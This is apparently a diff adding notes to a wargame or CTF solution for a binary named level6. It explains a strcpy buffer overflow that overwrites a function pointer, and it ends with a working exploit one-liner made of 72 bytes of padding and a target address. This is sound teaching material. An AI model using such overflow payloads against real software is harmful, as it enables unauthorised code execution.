@@ -1,1 +1,7 @@
+(more explanations in Ressources)
+
+we are back to good ol smashing: we have a pointer to m that needs to be changed so that it points to n
+we have an unsafe call to strcpy to copy our input (argv[1]) inside a buffer with only a size of 0x40(64)
+thanks to gdb we managed to find the exact padding and address of n
+
 ./level6 $(python -c "print 'B' * 72 + '\x54\x84\x04\x08'")
